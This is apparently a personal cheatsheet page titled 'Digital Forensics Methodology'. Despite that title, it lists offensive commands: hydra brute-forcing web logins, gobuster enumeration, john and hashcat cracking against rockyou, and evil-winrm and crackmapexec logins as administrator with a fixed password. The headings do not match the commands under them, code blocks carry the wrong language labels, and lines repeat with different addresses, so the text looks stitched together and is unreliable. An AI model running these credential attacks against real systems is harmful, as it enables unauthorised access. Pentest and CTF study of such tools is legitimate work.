---
TitleSEO: "Digital Forensics Methodology | ZureFX"
TitlePost: "Digital Forensics Methodology"
Author: "ZureFX"
Description: "Personal notes on Digital Forensics Methodology. Quick reference for pentesting and CTF challenges."
Keywords: "cheatsheet, networking, windows"
URL: "https://zurefx.github.io/notes/note-digital-forensics-methodology-832.html"
URL_IMAGES: ""
Date: "2024-06-11"
Tags: "Cheatsheet, Networking, Windows"
Section: "notes"
Lang: "en"
main_img: "note-digital-forensics-methodology-832"
Permalink: "/notes/note-digital-forensics-methodology-832.html"
BtnLabel: "Read Notes"
Pick: 0
---
## lookupsid

### NFS

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.61.171.70 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.79.94.9/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.104.66.249/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

## sharphound

### CSRF

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- `Kerberoasting`
- `Docker Escape`
- `GetNPUsers`
- `john`

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials.

```python
evil-winrm -i 10.128.161.192 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.166.213 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Remote File Inclusion

### Windows Server 2019

```powershell
evil-winrm -i 10.68.131.111 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.188.17 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p9200,21,143 10.23.230.6 -oN scan.txt
```

```bash
gobuster dir -u http://10.44.47.25/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

```powershell
crackmapexec smb 10.40.153.71 -u administrator -p 'P@ssw0rd!' --shares
```
